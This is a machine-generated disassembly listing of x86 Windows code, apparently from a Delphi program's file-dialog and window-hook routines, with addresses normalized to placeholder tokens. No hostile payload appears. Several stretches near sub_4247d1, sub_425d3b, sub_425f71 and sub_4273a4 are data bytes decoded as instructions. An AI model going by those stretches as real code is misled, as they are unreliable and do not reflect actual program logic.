mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_4245b8
cmp [ rw-data ] 0x0
jbe r-xdata
xor eax eax
call [ rw-data ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
call [ rw-data ]
test eax eax
jne r-xdata
retn
mov al 0x1
retn
sub_4245e0
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42462f
retn
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
call sub_403234
call sub_423c94
cmp [ rw-data ] 0x0
jg r-xdata
sub_424650
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42467c
retn
sub_424688
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4246b4
retn
sub_4246c0
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4246ec
retn
sub_4246f8
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424724
retn
sub_424730
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42475c
retn
sub_424768
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424794
retn
sub_4247d1
dec [ ebx - 0x1374aa40 ]
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424800
retn
sub_42481c
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424848
retn
sub_424854
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424880
retn
sub_42502c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
push esp
push esi
call GetWindowRect
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_454904
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x6c ]
test eax eax
je r-xdata
add edi eax
push edi
push 0x0
push esi
call SetWindowPos
add esp 0x10
pop edi
pop esi
pop ebx
retn
adc eax 0x0
mov eax [ rw-data ]
mov eax edx
call sub_450ea4
mov ebx eax
jmp r-xdata
mov edx [ rw-data ]
call sub_450ea4
mov ebx eax
jmp r-xdata
push 0x15
push 0x0
push 0x0
mov eax ebx
call sub_454608
mov edi eax
mov eax ebx
call sub_4545ec
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
mov ecx 0x3
cdq
idiv ecx
add edi eax
push edi
mov eax ebx
call sub_4545d4
mov edi eax
mov eax ebx
call sub_454620
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
sar eax 0x1
jns r-xdata
sub_4250e0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp esi 0x110
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov eax ebx
call sub_42502c
mov eax [ rw-data ]
mov [ eax + 0x3c ] ebx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
mov edx [ rw-data ]
mov [ edx + 0x34 ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
call CallWindowProcA
xor eax eax
mov [ rw-data ] eax
sub_425148
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4191e0
mov [ esi + 0x30 ] 0x1
push esi
push sub_425224
call sub_41a284
mov [ esi + 0x40 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_425190
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41922c
test bl bl
jle r-xdata
call sub_41a31c
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_4251c4
xor ecx ecx
mov edx [ edx ]
cmp edx [ rw-data ]
jne r-xdata
mov eax ecx
retn
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x38 ]
xchg edx eax
call sub_4572f8
mov cl 0x1
sub_4251ec
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_40346c
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x34 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_425224
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42524e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4252bc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
call GetActiveWindow
mov [ ebp - 0x10 ] eax
xor eax eax
call sub_44dce8
mov [ ebp - 0x14 ] eax
call sub_44dc04
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_456be8
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
push esi
call ebx
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425358
fnclex
fldcw [ ebp - 0x2 ]
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_456c44
retn
sub_425358
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425386
mov eax [ ebp - 0x14 ]
call sub_44dd9c
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x18 ]
call sub_44dc0c
retn
sub_4253b8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x110
jne r-xdata
cmp ebx 0x4e
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x3c ] esi
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
push 0xfffffffc
push esi
call SetWindowLongA
mov edx [ rw-data ]
mov [ edx + 0x34 ] eax
push edi
mov eax [ ebp + 0x10 ]
push eax
push ebx
push esi
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
call CallWindowProcA
xor eax eax
mov [ rw-data ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
cmp [ edi + 0x8 ] 0xfffffda7
jne r-xdata
push 0xfffffff8
push esi
call GetWindowLongA
call sub_42502c
sub_42543c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_425148
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ esi + 0x58 ] eax
mov eax [ r-xdata ]
mov [ esi + 0x5c ] eax
mov al [ r-xdata ]
mov [ esi + 0xb0 ] al
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ esi + 0x7c ] eax
mov [ esi + 0x64 ] 0x1
mov [ esi + 0x80 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_4254b5
add [ eax ] al
add [ ebx + 0x56 ] dl
call sub_4035a8
mov ebx edx
mov esi eax
mov eax [ esi + 0x7c ]
call sub_403234
mov eax [ esi + 0x58 ]
call sub_403234
mov edx ebx
and dl 0xfc
mov eax esi
call sub_425190
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_4254f0
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_425b78
mov eax edi
mov si 0xffed
call sub_403430
mov ebx eax
mov eax [ edi + 0x7c ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_425518
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov eax [ ebx ]
cmp eax 0x110
jne r-xdata
cmp eax 0x4e
jne r-xdata
test [ edi + 0x5e ] 0x1
je r-xdata
mov edx ebx
mov eax edi
call sub_425270
mov esi [ ebx + 0x8 ]
mov eax [ esi + 0x8 ]
add eax 0x260
cmp eax 0x7
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
jmp [ eax * 4 + jump_table_42555c ]
mov edx [ esi + 0xc ]
mov eax edi
call sub_4254f0
test al al
jne r-xdata
mov eax edi
mov si 0xffee
call sub_403430
jmp r-xdata
mov eax edi
mov si 0xffec
call sub_403430
jmp r-xdata
mov eax edi
mov si 0xffeb
call sub_403430
jmp r-xdata
mov eax [ esi + 0xc ]
mov eax [ eax + 0x18 ]
cmp eax [ edi + 0x68 ]
je r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax 0x1
mov [ ebx + 0xc ] eax
push eax
push 0x0
mov eax [ edi + 0x3c ]
push eax
call SetWindowLongA
jmp r-xdata
mov [ edi + 0x68 ] eax
mov eax edi
mov si 0xffea
call sub_403430
jmp r-xdata
mov [ esp ] 0x1
mov ecx esp
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax edi
mov si 0xffe9
call sub_403430
xor eax eax
mov al [ esp ]
mov [ ebx + 0xc ] eax
sub_425614
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xa2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov edx eax
mov eax [ ebx + 0xa4 ]
call [ ebx + 0xa0 ]
sub_42569c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
xchg edx eax
call sub_4174c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4256d5
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_4256d8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419558
push ebx
push sub_42569c
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_42571c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_403f6c
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov ecx r-xdata
mov edx esi
call sub_404278
mov eax [ ebx ]
call sub_40442c
mov dl 0x7c
call sub_40c07c
test eax eax
je r-xdata
mov [ eax ] 0x0
inc eax
mov dl 0x7c
call sub_40c07c
test eax eax
jne r-xdata
sub_42576c
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x7c ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea eax [ ebp - 0x68 ]
xor ecx ecx
mov edx 0x58
call sub_402c40
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
mov [ ebp - 0x68 ] 0x4c
mov eax [ rw-data ]
cmp [ eax ] 0x4
jl r-xdata
mov [ ebp - 0x68 ] 0x58
jmp r-xdata
mov [ ebp - 0x48 ] 0x104
mov [ ebp - 0x48 ] 0xffef
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x5a
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x60 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x60 ]
call sub_42571c
mov eax [ ebp - 0x8 ]
call sub_40442c
mov [ ebp - 0x5c ] eax
mov eax [ ebx + 0x64 ]
mov [ ebp - 0x50 ] eax
mov [ ebx + 0x68 ] eax
test [ ebx + 0x5c ] 0x40
je r-xdata
mov eax [ ebx + 0x6c ]
call sub_40442c
mov [ ebp - 0x3c ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ ebp - 0x48 ]
add edx 0x2
lea eax [ ebp - 0xc ]
call sub_4045b8
mov eax [ ebp - 0xc ]
call sub_40442c
mov esi eax
mov [ ebp - 0x4c ] esi
mov edx [ ebp - 0x48 ]
add edx 0x2
mov eax esi
xor ecx ecx
call sub_402c40
mov eax [ ebx + 0x78 ]
call sub_40442c
mov edx eax
mov ecx [ ebp - 0x48 ]
mov eax [ ebp - 0x4c ]
call sub_4083a8
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
jae r-xdata
and edx 0x7f
bt [ ebx + 0x5c ] edx
mov eax r-xdata
mov [ ebp - 0x3c ] eax
jmp r-xdata
inc eax
add esi 0x4
cmp al 0x16
jne r-xdata
mov edx [ esi ]
or [ ebp - 0x34 ] edx
mov eax [ ebx + 0x70 ]
call sub_40442c
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0x20
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov esi rw-data
mov edx eax
cmp dl 0x1f
ja r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
and [ ebp - 0x34 ] 0xfff7ffff
xor [ ebp - 0x34 ] 0x80000
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
test [ ebp - 0x32 ] 0x8
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ ebx + 0x5e ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_40442c
mov [ ebp - 0x2c ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x78 ]
call sub_40824c
lea eax [ ebp - 0x10 ]
mov ecx 0x1
mov edx 0x1
call sub_4044cc
lea eax [ ebp - 0x10 ]
mov edx [ ebx + 0x74 ]
call sub_404004
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jl r-xdata
xor eax eax
mov esi rw-data
mov [ ebp - 0x24 ] sub_4250e0
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x5a
jl r-xdata
jae r-xdata
and edx 0x7f
bt [ ebx + 0xb0 ] edx
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
mov [ ebp - 0x24 ] sub_4253b8
inc eax
add esi 0x4
cmp al 0x1
jne r-xdata
mov edx [ esi ]
or [ ebp - 0x14 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x64 ] eax
lea ecx [ ebp - 0x68 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov esi eax
test esi esi
je r-xdata
or [ ebp - 0x34 ] 0x40
mov [ ebp - 0x20 ] eax
mov edx eax
cmp dl 0x7
ja r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425a24
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403f90
retn
lea edx [ ebp - 0x68 ]
mov eax ebx
call sub_425b78
test [ ebp - 0x33 ] 0x4
je r-xdata
and [ ebx + 0x5c ] 0xffffff7f
or [ ebx + 0x5c ] 0x80
jmp r-xdata
and [ ebx + 0x5c ] 0xfffffffe
or [ ebx + 0x5c ] 0x1
jmp r-xdata
test [ ebp - 0x34 ] 0x1
je r-xdata
mov eax [ ebp - 0x50 ]
mov [ ebx + 0x64 ] eax
sub_425a30
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
mov dl [ eax - 0x1 ]
mov eax esi
call sub_40c07c
mov ebx eax
test ebx ebx
jne r-xdata
mov ecx ebx
sub ecx esi
mov eax edi
mov edx esi
call sub_40405c
inc ebx
mov eax edi
mov edx esi
call sub_404164
mov eax esi
call sub_40835c
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
sub_425a78
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_425a30
pop ecx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_425a30
pop ecx
mov ebx eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_408194
cmp [ eax ] 0x5c
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x7c ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x5c
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404234
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425b64
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f90
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x7c ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_425a30
pop ecx
mov ebx eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_40422c
cmp eax 0x3
jle r-xdata
lea eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_404278
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x1 ] 0x3a
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2 ] 0x5c
je r-xdata
sub_425b78
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp - 0x8 ]
test [ eax + 0x5c ] 0x40
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x5c ] 0x40
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x5e ] 0x1
jne r-xdata
push ebp
mov eax [ edx + 0x1c ]
mov edx [ ebp - 0x8 ]
add edx 0x78
call sub_425a30
pop ecx
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x78 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x7c ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
push ebp
mov eax [ edx + 0x1c ]
call sub_425a78
pop ecx
lea ecx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x7c ]
xor edx edx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax 0x78
call sub_403fc0
jmp r-xdata
mov [ ebp - 0x1 ] 0x20
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425c2a
lea eax [ ebp - 0xc ]
call sub_403f6c
retn
sub_425c30
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
push 0x0
push esi
xor ecx ecx
xor edx edx
xor eax eax
call sub_41240c
test [ ebx + 0x5e ] 0x1
jne r-xdata
push esi
push edi
call GetClientRect
jmp r-xdata
push esi
push 0x45f
push edi
call GetDlgItem
push eax
call GetWindowRect
push 0x2
push esi
mov eax [ ebx + 0x3c ]
push eax
push 0x0
call MapWindowPoints
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_425c84
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x78 ]
call sub_403fc0
cmp [ ebx + 0x3c ] 0x0
je r-xdata
mov eax esp
push eax
push 0x105
push 0x465
mov eax [ ebx + 0x3c ]
push eax
call GetParent
push eax
call SendMessageA
mov edx esi
mov eax esp
call sub_408530
jmp r-xdata
add esp 0x108
pop esi
pop ebx
retn
sub_425cec
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov eax esi
call sub_40422c
mov ebx eax
cmp ebx 0x1
jle r-xdata
lea eax [ edi + 0x6c ]
push eax
mov ecx ebx
mov edx 0x1
mov eax esi
call sub_40448c
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_40bf04
test al al
je r-xdata
mov ecx ebx
dec ecx
mov edx esi
mov eax r-xdata
call sub_40bf38
test al al
jne r-xdata
dec ebx
sub_425d3b
inc [ ecx ]
add [ eax ] al
add [ edx ] bh
add [ eax ] al
add [ ebx - 0x75 ] dl
fdivr [ edx + GetOpenFileNameA ]
mov eax ebx
call sub_42576c
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_425e34
add esp 0xffffffd0
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push 0x1
mov eax [ rw-data ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x0
call GetCurrentThreadId
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] 0x0
lea ecx [ esp + 0x24 ]
mov edx r-xdata
lea eax [ esp + 0x4 ]
call sub_4089a0
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
add esp 0x30
retn
sub_425f71
test [ ebp ] rw-data
add [ eax ] al
add [ eax ] al
mov bh dh
inc ebp
add [ eax + eax ] bl
inc esi
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425fe1
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
mov ecx 0xb
mov edx [ r-xdata ]
call sub_4049e8
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
sub_425fe4
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403d40
call sub_425e34
mov eax [ r-xdata ]
call sub_41307c
mov eax [ r-xdata ]
call sub_41311c
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4130c8
sub_4273a4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
je r-xdata
cmp eax 0xde4c0041
inc edx
add [ eax ] bl
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x77ffbd8c ] al
je r-xdata
xchg ebp eax
inc ebx
add [ eax ] dl
xchg esi eax
inc ebx
add [ eax ] bh
fild [ edx ]
pushad
inc ebx
add [ edi + 0x71400043 ] dl
inc ebx
jno r-xdata
add [ eax + 0x1 ] dl
mov eax 0x99640042
inc ecx
add [ eax + 0x34 ] dh
inc eax
add [ edx + edx * 4 + 0x34780041 ] ah
inc eax
